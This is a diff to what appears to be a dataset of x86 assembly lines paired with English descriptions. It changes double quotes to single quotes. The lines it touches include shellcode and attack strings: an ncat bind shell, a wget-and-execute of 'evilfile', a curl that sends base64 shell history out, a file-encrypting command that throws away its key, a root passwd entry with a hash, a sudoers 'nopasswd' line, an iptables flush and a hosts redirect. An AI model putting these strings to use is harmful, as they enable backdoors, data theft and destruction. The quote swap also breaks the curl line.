@@ -469,13 +469,13 @@ db '/sbin/iptables#-f#'	define the byte string '/sbin/iptables#-f#'
 db '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'	define the byte string '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'
 db '0',10	define the byte string '0',10
 db 'my.txtx'	define the byte string 'my.txtx'
-db "/bin/sh"	define the byte string "/bin/sh"
-db "/etc/passwd#"	define the byte string "/etc/passwd#"
-db "all all=(all) nopasswd: all", 0xa	define the byte string "all all=(all) nopasswd: all"
-db "cp /bin/sh /tmp/sh"	define the byte string "cp /bin/sh /tmp/sh"
-db "egg mark"	define the byte string "egg mark"
-db "egg mark"	initialize a string to "egg mark"
-db "rm -f /tmp/f"	define the byte string "rm -f /tmp/f"
+db '/bin/sh'	define the byte string '/bin/sh'
+db '/etc/passwd#'	define the byte string '/etc/passwd#'
+db 'all all=(all) nopasswd: all', 0xa	define the byte string 'all all=(all) nopasswd: all'
+db 'cp /bin/sh /tmp/sh'	define the byte string 'cp /bin/sh /tmp/sh'
+db 'egg mark'	define the byte string 'egg mark'
+db 'egg mark'	initialize a string to 'egg mark'
+db 'rm -f /tmp/f'	define the byte string 'rm -f /tmp/f'
 db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b	define an array of bytes and initialize it to 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b
 db 0x68	declare a byte contining 0x68
 db 0x68	declare a byte with no label containing the value 0x68
@@ -552,8 +552,8 @@ dup2:	define dup2 function
 dup2loop:	delcare the dup2loop label
 duploop:	declare the duploop label
 duploop:	define duploop function
-egg equ "egg "	define egg equal to "egg "
-egg1 equ "mark"	define egg1 equal to "mark"
+egg equ 'egg '	define egg equal to 'egg '
+egg1 equ 'mark'	define egg1 equal to 'mark'
 egghunter:	declare the egghunter label
 enc:	declare the enc label
 encodedshellcode: db 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce	define the array of bytes encodedshellcode and initialize it to 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce
@@ -570,7 +570,7 @@ exit_on_error:	declare the exit_on_error label
 exit:	declare the exit label
 exit:	define exit function
 exit:	define the exit label
-file: db "/sbin/iptables#-f"	define file as the byte string "/sbin/iptables#-f"
+file: db '/sbin/iptables#-f'	define file as the byte string '/sbin/iptables#-f'
 fileaddress:	declare the fileaddress label
 filecontents: resb 128	reserve filecontents variable of 128 bytes
 filename: db 'readme.txt', 0h	create a string filename and initialize to 'readme.txt'
@@ -593,8 +593,8 @@ global _start	declare _start as global label
 global _start	declare global _start
 global _start	global _start
 global _start:	declare the global _start label
-google db "127.1.1.1 google.com"	define google as the byte string "127.1.1.1 google.com"
-google: db "127.1.1.1 google.com"	define the byte string google and initialize it to "127.1.1.1 google.com"
+google db '127.1.1.1 google.com'	define google as the byte string '127.1.1.1 google.com'
+google: db '127.1.1.1 google.com'	define the byte string google and initialize it to '127.1.1.1 google.com'
 gotocall:	declare the gotocall label
 hello: db 'hello world!',10	create a string 'hello world!' plus a linefeed character
 hellolen: equ $-hello	define hellolen equal to the length of the hello string
@@ -944,7 +944,7 @@ len equ $-encodedshellcode	define len equal to the lenght of the encodedshellcod
 len: equ $-google	declare the len label equal to the size of the google variable
 len: equ $-shellcode	declare the len label equal to the length of shellcode
 letter_c db 'c'	allocate a single byte of memory and initialize it to the letter 'c'
-line db "/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile", 0x0a	define line as the byte string "/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile", 0x0a
+line db '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a	define line as the byte string '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a
 loader:	declare the loader label
 loop .3	decrement the counter and jump to .3 label if the count is not zero
 loop 3	decrement ecx and jumps to the 3 label unless decrementing ecx caused its value to become zero
@@ -1009,10 +1009,10 @@ matrix qw 12*10	allocate memory for a 12*10 quad-bytes matrix
 me:	declare the me label
 me:	define me label
 message db '/bin/sh'	define message byte and initialize it to '/bin/sh'
-message db 'hello',13,0	allocate memory for a null terminated string "hello\n"
-message db "/bin/sh"	define message as the byte string "/bin/sh"
-message db "/etc/passwd"	define message as the byte string "/etc/passwd"
-message db "/etc/passwd"	define the string message and initialize it to "/etc/passwd"
+message db 'hello',13,0	allocate memory for a null terminated string 'hello\n'
+message db '/bin/sh'	define message as the byte string '/bin/sh'
+message db '/etc/passwd'	define message as the byte string '/etc/passwd'
+message db '/etc/passwd'	define the string message and initialize it to '/etc/passwd'
 message: db 'hello world!'	declare message to contain the bytes 'hello world!'
 message: db 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68	define message as array of bytes and initialize it to 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68
 mov [1000h], ax	move the value of ax into memory at address 1000h
@@ -1825,13 +1825,13 @@ mov word [esp+0x1], 0x776f	move 0x776f into the word in [esp+0x1]
 mov x, eax	move eax to x variable
 msg db 'hello, world!', 0xa	declare msg string containing 'hello world!'
 msg db 'i love you!', 0ah	define msg variable and initialize with 'i love you!'
-msg db "curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post", 0x0a	define msg as the byte string "curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post"
-msg db "mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt", 0x0a	define msg as the byte string "mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt"
-msg db "we found the egg!", 0ah, 0dh	define msg as the byte string "we found the egg!"
+msg db 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post', 0x0a	define msg as the byte string 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post'
+msg db 'mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt', 0x0a	define msg as the byte string 'mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt'
+msg db 'we found the egg!', 0ah, 0dh	define msg as the byte string 'we found the egg!'
 msg_len equ $-msg	define msg_len equal to the length of msg
 msg1 db 'hello, brave new world!', 0ah	declare message string msg1 containing 'hello brave new world!'
 msg2 db 'this is how we recycle in nasm.', 0ah	declare message string msg2 containing 'this is how we recycle in nasm'
-msg2 db "passwd", 0x00	define msg2 as the byte string "passwd"
+msg2 db 'passwd', 0x00	define msg2 as the byte string 'passwd'
 msglength: equ 12	declare msglength to have the constant value 12
 mul [tmp]	multiply the contents of eax by the 32-bit contents of the memory location tmp
 mul [value]	multiply the contents of eax by the 32-bit contents of the memory location value
@@ -1903,8 +1903,8 @@ or cx, 0xfff	perform logical or between the cx register and 0xfff
 or dx, 0xfff	perform or operation between dx and 0xfff and save the result into dx
 or eax, 0xffffffff	perform the or operation between the eax register and 0xffffffff
 output:	declare the output label
-path db "//bin/sh"	define path as the byte string "//bin/sh"
-path db "//bin/sh"	define the byte string path and initialize it to "//bin/sh"
+path db '//bin/sh'	define path as the byte string '//bin/sh'
+path db '//bin/sh'	define the byte string path and initialize it to '//bin/sh'
 path:	declare the path label
 pop [eax]	pop the top element of the stack into memory at the four bytes starting at location eax
 pop [ebx]	pop the top element of the stack into memory at the four bytes starting at location ebx
@@ -1967,11 +1967,11 @@ priv_setgid:	declare the priv_setgid label
 priv_setuid:	declare the priv_setuid label
 process_shellcode:	declare the process_shellcode label
 push _ip	push _ip onto the stack
-push "//pa"	push "//pa" onto the stack
-push "//sh"	push "//sh" onto the stack
-push "/bin"	push "/bin" onto the stack
-push "/etc"	push "/etc" onto the stack
-push "sswd"	push "sswd" onto the stack
+push '//pa'	push '//pa' onto the stack
+push '//sh'	push '//sh' onto the stack
+push '/bin'	push '/bin' onto the stack
+push '/etc'	push '/etc' onto the stack
+push 'sswd'	push 'sswd' onto the stack
 push [tmp]	push the 4 bytes at address tmp onto stack
 push [var]	push the 4 bytes at address var onto the stack
 push [var2]	push the 4 bytes at address var2 onto the stack
@@ -2755,7 +2755,7 @@ shell_ret:	declare the shell_ret label
 shell:	declare the shell label
 shellcode:	declare the shellcode label
 shellcode:	define shellcode label
-shellcode: db "vl43ck:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/bin/bash"	define the array of bytes shellcode and initialize it to vl43ck:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/bin/bash
+shellcode: db 'vl43ck:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/bin/bash'	define the array of bytes shellcode and initialize it to vl43ck:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/bin/bash
 shellcode: db 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23	define shellcode as an array of bytes and initialize it to 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23
 shellcodelen equ $-shellcode	define shellcodelen equal to the length of shellcode
 shellcodelen equ $-shellcode	define shellcodelen equal to the length shellcode
@@ -2814,13 +2814,13 @@ start:	declare the start label
 stc	set carry flag
 str db 'hello',0	declare 6 bytes starting at the address str initialized to the ascii character values for hello and the null byte
 str db 'hey',0	declare 4 bytes starting at the address str initialized to the ascii character values for the string 'hey' and 0 respectively
-string db "test.txt"	define string as the byte string "test.txt"
-string: db "/bin/sh"	define string as the byte string "/bin/sh"
-string: db "/etc/passwd"	define string as the byte string "/etc/passwd"
-string: db "file.txt"	define string as the byte string "file.txt"
-string: db "file1.txt"	define string as the byte string "file1.txt"
-string: db "prova.txt"	define string as the byte string "prova.txt"
-string: db "tmp.txt"	define string as the byte string "tmp.txt"
+string db 'test.txt'	define string as the byte string 'test.txt'
+string: db '/bin/sh'	define string as the byte string '/bin/sh'
+string: db '/etc/passwd'	define string as the byte string '/etc/passwd'
+string: db 'file.txt'	define string as the byte string 'file.txt'
+string: db 'file1.txt'	define string as the byte string 'file1.txt'
+string: db 'prova.txt'	define string as the byte string 'prova.txt'
+string: db 'tmp.txt'	define string as the byte string 'tmp.txt'
 sub [var], esi	subtract the contents of esi from the 32-bit integer stored at memory location var
 sub [var2], esi	subtract the contents of esi from the 32-bit integer stored at memory location var2
 sub al, 0x41	subtract 0x41 from the al register
